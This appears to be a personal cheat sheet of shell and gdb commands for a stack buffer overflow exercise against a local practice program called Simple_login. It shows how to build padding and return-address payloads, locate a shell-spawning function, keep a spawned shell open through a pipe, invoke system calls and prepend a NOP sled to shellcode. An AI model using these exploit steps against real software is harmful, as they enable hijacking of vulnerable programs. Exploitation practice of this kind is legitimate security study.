perl -e 'printf"A"*72;print"\x12\x34\x56\x78"' > payload 
echo `python -c 'print"A"*200'`

xxd -g 1 payload

tcc -g -o Simple_login Simple_login.c --> -g for gdb, tcc for tiny c compiler(without optimizations)

print "%d" $esp-$ebp

objdump -t Simple_login | grep go_shell --> start address of go_shell function

(gdb) run < payload

gdb basic_vuln core

(cat payload;cat)|./Simple_login --> The unix pipe “|” is to redirect output of our command (cat payload;cat) and use it as 
the input for simple_login. We have to put the extra “cat” in the command to echo Commands to the shell we will spawn, otherwise an EOF is sent and the shell closes immediately before we can actually execute any programs. 

Look up the number corresponding to the system call in /usr/include/x86_64-linux-gnu/asm/unistd_64.h for x86-64 and /usr/include/x86_64-linux-gnu/asm/unistd_32.h for x86.

Place system call number in eax/rax, and arguments in ebx/rdi,ecx/rsi,edx/rdx,r10,r8,r9… etc in the order they appear in the corresponding man page.

Execute int 0x80 on x86 and syscall on x86-64  to alert the kernel you want to perform a system call.

wc hello.shellcode

perl -e ('print "\x90"*(64-34)';cat hello.shellcode) | cat > payload

./Simple_login < payload2

./Simple_login `cat payload2`

ulimit -c unlimited --> dump core after segfault

